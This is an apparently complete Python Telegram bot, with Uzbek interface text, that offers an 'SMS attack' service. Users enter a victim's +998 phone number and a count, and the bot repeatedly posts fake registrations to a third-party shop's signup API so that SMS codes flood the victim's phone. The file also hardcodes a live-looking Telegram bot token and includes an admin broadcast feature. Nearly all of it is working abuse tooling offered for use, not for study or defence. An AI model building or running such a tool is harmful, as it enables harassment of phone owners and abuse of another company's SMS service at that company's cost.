import telebot
import requests
import time
import sqlite3
from telebot import types

API_TOKEN = '7284212779:AAGdMJr-H2FnkXEEev7Sj7WMn9OTLAHIUrI'
ADMIN = '7334155826'
orqaga_qaytish ="⬅️  Orqaga qaytish"

bot = telebot.TeleBot(API_TOKEN)

# Global variables
bot_running = True
sms_sending = False
sent_requests_count = 0  # Count of sent requests
user_data = {}  # Dictionary to store user data temporarily


# SQLite database initialization
def initialize_database():
    try:
        with sqlite3.connect('user_data.db') as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chat_id INTEGER NOT NULL UNIQUE,
                    last_message_sent TEXT DEFAULT NULL
                )
            ''')
            conn.commit()
    except sqlite3.Error as e:
        print(f"Error initializing database: {e}")


initialize_database()


# Bot commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = str(message.chat.id)
    try:
        with sqlite3.connect('user_data.db') as conn:
            cursor = conn.cursor()
            cursor.execute('INSERT OR IGNORE INTO users (chat_id) VALUES (?)', (chat_id,))
            conn.commit()
        bot.reply_to(message,
                     "Assalomu alaykum! Men SMS yuborish telegram botiman. SMS yuborish tugmasini bosganingizda xavsizlikni o'z bo'yingizga olasiz.")
        show_main_menu(message)
    except sqlite3.Error as e:
        log_error(f"Error saving chat ID to database: {e}")
        bot.reply_to(message, "Xatolik yuz berdi. Iltimos, qaytadan urinib ko‘ring.")


@bot.message_handler(commands=['stop'])
def stop_bot(message):
    global bot_running
    bot_running = False
    bot.reply_to(message, "Bot to'xtatildi.")


# Handling SMS request initiation
@bot.message_handler(func=lambda message: message.text == '😁 SMS yuborish')
def request_phone(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    back_button = telebot.types.KeyboardButton('⬅️  Orqaga qaytish')
    markup.add(back_button)
    bot.send_message(message.chat.id, "Telefonga sms hujum qilmoqchi bo'lgan raqamingizni kiriting (masalan, +998xxxxxxxxx):", reply_markup=markup)
    bot.register_next_step_handler(message, process_phone_step)


@bot.message_handler(func=lambda message: message.text == orqaga_qaytish)
def go_back(message):
    show_main_menu(message)


def process_phone_step(message):
    try:
        phone = message.text
        if phone == orqaga_qaytish:
            show_main_menu(message)  # Asosiy menyuni ko'rsatadi
            return

        if not phone.startswith('+998') or len(phone) != 13:
            bot.reply_to(message, "Telefon raqami noto'g'ri. Iltimos, qaytadan kiriting (masalan, +998xxxxxxxxx):")
            bot.register_next_step_handler(message, process_phone_step)
            return

        user_data[message.chat.id] = {'phone': phone, 'count': None}
        bot.reply_to(message, "Nechta so'rov yuborishni xohlaysiz (masalan, 4):")
        bot.register_next_step_handler(message, process_count_step)
    except Exception as e:
        log_error(f"Error in process_phone_step: {e}")
        bot.reply_to(message, 'Xatolik yuz berdi. Iltimos, qaytadan urinib ko‘ring.')



def process_count_step(message):
    global sms_sending
    try:
        # Agar foydalanuvchi '⬅️  Orqaga qaytish' tugmasini bossalar
        if message.text == orqaga_qaytish:
            show_main_menu(message)  # Asosiy menyuni ko'rsatadi
            return

        count = int(message.text)
        if count <= 0:
            bot.reply_to(message, 'Iltimos, musbat raqam kiriting.')
            bot.register_next_step_handler(message, process_count_step)
            return

        user_data[message.chat.id]['count'] = count
        sms_sending = True

        markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        stop_button = telebot.types.KeyboardButton('🛑 To‘xtatish')
        markup.add(stop_button)
        bot.send_message(message.chat.id, "So'rovlar yuborilmoqda...", reply_markup=markup)

        send_requests(message)
    except ValueError:
        bot.reply_to(message, 'Iltimos, raqam kiriting.')
        bot.register_next_step_handler(message, process_count_step)
    except Exception as e:
        log_error(f"Error in process_count_step: {e}")
        bot.reply_to(message, 'Xatolik yuz berdi. Iltimos, qaytadan urinib ko‘ring.')



# Sending SMS requests
def send_requests(message):
    global sms_sending, sent_requests_count
    chat_id = message.chat.id
    phone = user_data.get(chat_id, {}).get('phone')
    count = user_data.get(chat_id, {}).get('count')

    if not phone or not count:
        bot.reply_to(message, 'Xatolik: Telefon raqami yoki so\'rovlar soni topilmadi.')
        return

    sent_requests_count = 0  # Reset count for each request

    for i in range(1, count + 1):  # Start count from 1
        if not sms_sending:
            break
        response = send_post_request(phone)
        sent_requests_count += 1
        bot.reply_to(message, f"{i}-sms yuborildi")  # Display request number

    # Report total sent requests
    bot.send_message(message.chat.id, f"Jami {sent_requests_count} ta SMS yuborildi.")

    # Show main menu after sending requests
    show_main_menu(message)


def send_post_request(phone):
    url = 'https://api.robosell.uz/api/v2/auth/register'
    data = {
        "phone": phone,
        "password": "fwefewfew",
        "password2": "fwefewfew",
        "firstname": "dqedwedew"
    }
    response = requests.post(url, json=data)
    return response


# Handling stop SMS sending
@bot.message_handler(func=lambda message: message.text == '🛑 To‘xtatish')
def stop_sms_sending(message):
    global sms_sending
    sms_sending = False
    bot.reply_to(message, "SMS yuborish to'xtatildi.")


# Showing main menu
def show_main_menu(message):
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button_sms = telebot.types.KeyboardButton('😁 SMS yuborish')
    button_statistika = telebot.types.KeyboardButton('📊 Statistika')
    markup.add(button_sms, button_statistika)

    if str(message.chat.id) == ADMIN:
        button_send_message = telebot.types.KeyboardButton('✍️ Reklama')
        markup.add(button_send_message)

    bot.send_message(message.chat.id, "Tugmalardan birini tanlang:", reply_markup=markup)

    # Ensure that 'Tugmalardan birini tanlang:' is sent only once
    bot.clear_step_handler_by_chat_id(message.chat.id)


# Handling send message to all users button
@bot.message_handler(func=lambda message: message.text == '✍️ Reklama')
def handle_send_message_to_all(message):
    if str(message.chat.id) != ADMIN:
        bot.reply_to(message, "Sizga ruxsat berilmagan.")
        return

    try:
        # Prompt the admin to enter the message
        markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        back_button = telebot.types.KeyboardButton(orqaga_qaytish)
        markup.add(back_button)
        bot.send_message(message.chat.id, "Xabarni, rasmni, musiqani, yoki faylni kiriting:", reply_markup=markup)
        bot.register_next_step_handler(message, process_send_message_to_all)
    except Exception as e:
        log_error(f"Error in handle_send_message_to_all: {e}")
        bot.reply_to(message, 'Xatolik yuz berdi. Iltimos, qaytadan urinib ko‘ring.')


def process_send_message_to_all(message):
    if message.text == orqaga_qaytish:
        show_main_menu(message)
        return

    try:
        with sqlite3.connect('user_data.db') as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT chat_id FROM users')
            rows = cursor.fetchall()

            success_count = 0
            failure_count = 0

            # Determine the type of the message
            if message.content_type == 'text':
                for row in rows:
                    try:
                        bot.send_message(row[0], message.text)
                        success_count += 1
                    except Exception:
                        failure_count += 1
            elif message.content_type == 'photo':
                for row in rows:
                    try:
                        bot.send_photo(row[0], message.photo[-1].file_id, caption=message.caption)
                        success_count += 1
                    except Exception:
                        failure_count += 1
            elif message.content_type == 'audio':
                for row in rows:
                    try:
                        bot.send_audio(row[0], message.audio.file_id, caption=message.caption)
                        success_count += 1
                    except Exception:
                        failure_count += 1
            elif message.content_type == 'document':
                for row in rows:
                    try:
                        bot.send_document(row[0], message.document.file_id, caption=message.caption)
                        success_count += 1
                    except Exception:
                        failure_count += 1
            else:
                bot.reply_to(message, 'Bu turdagi xabar qo‘llab-quvvatlanmaydi.')

            bot.send_message(message.chat.id,
                             f"Barcha foydalanuvchilarga xabar yuborildi. Muvaffaqiyatli: {success_count}ta, Muvaffaqiyatsiz: {failure_count}ta")
            show_main_menu(message)
    except Exception as e:
        log_error(f"Error in process_send_message_to_all: {e}")
        bot.reply_to(message, 'Xatolik yuz berdi. Iltimos, qaytadan urinib ko‘ring.')

        # Handling statistics button


@bot.message_handler(func=lambda message: message.text == '📊 Statistika')
def handle_statistics(message):
    try:
        with sqlite3.connect('user_data.db') as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*), GROUP_CONCAT(chat_id) FROM users')
            result = cursor.fetchone()
            total_users = result[0]

            # Havolali InlineKeyboardButton yaratish
            markup = types.InlineKeyboardMarkup()
            link_button = types.InlineKeyboardButton(text="🧑‍💻 Developed by Shohbozbek", url="https://t.me/Shohbozbek_Turgunov_dev")
            markup.add(link_button)

            # Statistikani yuborish
            bot.reply_to(message,
                         f"☑️ Jami foydalanuvchilar soni: {total_users}ta",
                         reply_markup=markup)
    except sqlite3.Error as e:
        log_error(f"Error retrieving statistics: {e}")
        bot.reply_to(message, 'Xatolik yuz berdi. Iltimos, qaytadan urinib ko‘ring.')


def log_error(error_message):
    with open('error.log', 'a') as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {error_message}\n")


# Start the bot
if __name__ == "__main__":
    bot.infinity_polling()
